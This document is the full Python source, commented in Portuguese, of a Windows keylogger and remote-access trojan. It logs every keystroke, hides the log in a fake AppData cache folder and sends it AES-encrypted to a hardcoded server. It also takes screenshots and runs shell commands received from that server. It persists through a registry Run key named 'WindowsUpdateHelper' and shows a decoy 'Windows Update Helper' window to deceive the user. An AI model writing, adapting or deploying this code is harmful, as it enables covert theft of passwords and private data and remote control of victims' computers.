import os
import sys
import threading
import time
import requests
import base64
import subprocess
import queue
import winreg
import webbrowser
from datetime import datetime

# Bibliotecas de interface (tkinter)
import tkinter as tk

# Bibliotecas principais
from pynput import keyboard
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import mss

# ============================================================
# CONFIGURAÇÕES GLOBAIS (AJUSTE AQUI)
# ============================================================
SERVIDOR = "http://192.168.3.144:8080"   # Substitua pelo IP do seu servidor
CLIENT_ID = "default"                    # Identificador único do cliente
CHAVE = bytes.fromhex("00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff")
INTERVALO_ENVIO = 20                     # Envio de logs a cada 20 segundos
PASTA_LOG = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Cache')
ARQUIVO_LOG = os.path.join(PASTA_LOG, 'syslog.txt')
# ============================================================

# ============================================================
# FUNÇÕES AUXILIARES
# ============================================================
def adicionar_persistencia():
    """Adiciona o executável ao registro com --silent para iniciar automaticamente."""
    try:
        if getattr(sys, 'frozen', False):
            caminho = sys.executable
        else:
            caminho = os.path.abspath(sys.argv[0])
            caminho = f'python.exe "{caminho}"'
        comando = f'"{caminho}" --silent' if not caminho.startswith('python') else f'{caminho} --silent'
        
        chave = winreg.HKEY_CURRENT_USER
        subchave = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(chave, subchave, 0, winreg.KEY_SET_VALUE) as reg:
            winreg.SetValueEx(reg, "WindowsUpdateHelper", 0, winreg.REG_SZ, comando)
        return True
    except Exception:
        return False

def criptografar(texto):
    """Criptografa dados com AES-CBC e retorna em Base64."""
    texto_limpo = ''.join(c for c in texto if c.isprintable() or c in '\n\r\t')
    iv = os.urandom(16)
    cipher = AES.new(CHAVE, AES.MODE_CBC, iv)
    dados = pad(texto_limpo.encode('utf-8', errors='ignore'), AES.block_size)
    return base64.b64encode(iv + cipher.encrypt(dados)).decode()

def descriptografar(dados_b64):
    """Descriptografa dados recebidos do servidor."""
    raw = base64.b64decode(dados_b64.strip())
    iv, cifra = raw[:16], raw[16:]
    texto = unpad(AES.new(CHAVE, AES.MODE_CBC, iv).decrypt(cifra), AES.block_size)
    return texto.decode('utf-8')

# ============================================================
# CLASSE PRINCIPAL – KEYLOGGER
# ============================================================
class Keylogger:
    def __init__(self):
        self.log = ""
        self.running = True
        self.screenshot_ativa = False
        os.makedirs(PASTA_LOG, exist_ok=True)
        
        # Adiciona persistência (apenas uma vez)
        adicionar_persistencia()
        
        # Inicia threads de serviços (daemon=False para manter vivo)
        threading.Thread(target=self.shell_listener, daemon=False).start()
        threading.Thread(target=self.screenshot_timer, daemon=False).start()

    def on_press(self, key):
        """Callback chamado a cada tecla pressionada."""
        try:
            self.log += key.char
        except AttributeError:
            if key == keyboard.Key.space:
                self.log += " "
            elif key == keyboard.Key.enter:
                self.log += "\n"
            elif key == keyboard.Key.backspace:
                self.log = self.log[:-1]
            else:
                self.log += f" [{str(key).replace('Key.', '')}] "
        if len(self.log) > 1000:
            self.salvar_buffer()

    def salvar_buffer(self):
        """Salva o buffer de logs no arquivo local."""
        with open(ARQUIVO_LOG, 'a', encoding='utf-8') as f:
            f.write(self.log)
        self.log = ""

    def enviar_logs(self):
        """Envia logs acumulados para o servidor."""
        if self.log:
            self.salvar_buffer()
        if os.path.exists(ARQUIVO_LOG) and os.path.getsize(ARQUIVO_LOG) > 0:
            with open(ARQUIVO_LOG, 'r', encoding='utf-8') as f:
                dados = f.read()
            if dados.strip():
                try:
                    requests.post(f"{SERVIDOR}/log", json={'dados': criptografar(dados)}, timeout=5)
                    open(ARQUIVO_LOG, 'w').close()
                except:
                    pass

    def capturar_tela(self):
        """Captura a tela inteira e envia ao servidor."""
        try:
            with mss.mss() as sct:
                img = sct.grab(sct.monitors[1])
                img_b64 = base64.b64encode(mss.tools.to_png(img.rgb, img.size)).decode()
                requests.post(f"{SERVIDOR}/screenshot", json={'id': CLIENT_ID, 'imagem': img_b64}, timeout=10)
                return True
        except:
            return False

    def screenshot_timer(self):
        """Loop que captura tela automaticamente a cada 30s (se ativado)."""
        while self.running:
            if self.screenshot_ativa:
                self.capturar_tela()
            time.sleep(30)

    def shell_listener(self):
        """Loop que consulta o servidor em busca de comandos."""
        while self.running:
            try:
                resp = requests.get(f"{SERVIDOR}/cmd", params={'id': CLIENT_ID}, timeout=30)
                if resp.text and resp.text.strip():
                    cmd = descriptografar(resp.text.strip()).lower()
                    
                    if cmd in ('shutdown', 'exit'):
                        self.running = False
                        resultado = "[+] Cliente finalizado"
                    elif cmd == 'restart':
                        resultado = "[+] Reiniciando cliente..."
                        self.running = False
                        os.execv(sys.executable, [sys.executable] + sys.argv)
                    elif cmd == 'screenshot':
                        ok = self.capturar_tela()
                        resultado = "[+] Screenshot capturado" if ok else "[-] Falha no screenshot"
                    elif cmd == 'screenshot_on':
                        self.screenshot_ativa = True
                        resultado = "[+] Captura automática ativada"
                    elif cmd == 'screenshot_off':
                        self.screenshot_ativa = False
                        resultado = "[-] Captura automática desativada"
                    else:
                        # Comando normal do shell
                        output = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                        resultado = f"$ {cmd}\n{output.stdout}{output.stderr}"
                    
                    # Envia o resultado de volta ao servidor
                    requests.post(f"{SERVIDOR}/result", json={'id': CLIENT_ID, 'resultado': criptografar(resultado)}, timeout=5)
            except requests.Timeout:
                continue
            except:
                time.sleep(5)

    def report(self):
        """Envia logs periodicamente."""
        self.enviar_logs()
        if self.running:
            threading.Timer(INTERVALO_ENVIO, self.report).start()

    def start(self):
        """Inicia o keylogger (listener de teclado + loop de envio)."""
        self.report()
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

# ============================================================
# INTERFACE FAKE "WINDOWS UPDATE HELPER" (VERSÃO ESTÁTICA)
# ============================================================
def fake_update_window():
    """Janela helper estática com botões úteis."""
    root = tk.Tk()
    root.title("Windows Update Helper")
    root.geometry("400x200")
    root.resizable(False, False)
    root.configure(bg='#f0f0f0')

    label_icone = tk.Label(root, text="🛡️", font=('Segoe UI', 28), bg='#f0f0f0')
    label_icone.pack(pady=(20, 5))

    label_titulo = tk.Label(root, text="Windows Update Helper", font=('Segoe UI', 12, 'bold'), bg='#f0f0f0', fg='#2a2a2a')
    label_titulo.pack(pady=(0, 10))

    label_sub = tk.Label(root, text="Clique nos botões abaixo para gerenciar suas atualizações.",
                         font=('Segoe UI', 9), bg='#f0f0f0', fg='#555')
    label_sub.pack(pady=(0, 15))

    frame_botoes = tk.Frame(root, bg='#f0f0f0')
    frame_botoes.pack(pady=10)

    btn_update = tk.Button(frame_botoes, text="⚙️ Abrir Windows Update",
                           font=('Segoe UI', 9), bg='#e1e1e1', fg='#000',
                           relief='groove', padx=15, pady=5,
                           command=lambda: subprocess.run("start ms-settings:windowsupdate", shell=True))
    btn_update.grid(row=0, column=0, padx=10)

    btn_ajuda = tk.Button(frame_botoes, text="❓ Ajuda sobre atualizações",
                          font=('Segoe UI', 9), bg='#e1e1e1', fg='#000',
                          relief='groove', padx=15, pady=5,
                          command=lambda: webbrowser.open("https://support.microsoft.com/pt-br/windows"))
    btn_ajuda.grid(row=0, column=1, padx=10)

    btn_fechar = tk.Button(root, text="Fechar", font=('Segoe UI', 9),
                           bg='#d32f2f', fg='#fff', relief='groove', padx=20, pady=5,
                           command=root.destroy)
    btn_fechar.pack(pady=10)

    # Permite fechar com o 'X' (apenas a janela, keylogger continua)
    root.protocol("WM_DELETE_WINDOW", root.destroy)

    root.mainloop()

# ============================================================
# PONTO DE ENTRADA
# ============================================================
if __name__ == "__main__":
    if "--silent" in sys.argv:
        # Modo silencioso: apenas o keylogger (sem interface)
        kl = Keylogger()
        kl.start()
    else:
        # Modo interativo: inicia keylogger em background e exibe janela helper
        kl = Keylogger()
        t = threading.Thread(target=kl.start, daemon=False)
        t.start()
        fake_update_window()
        # Aguarda a thread do keylogger terminar (se um dia terminar)
        t.join()
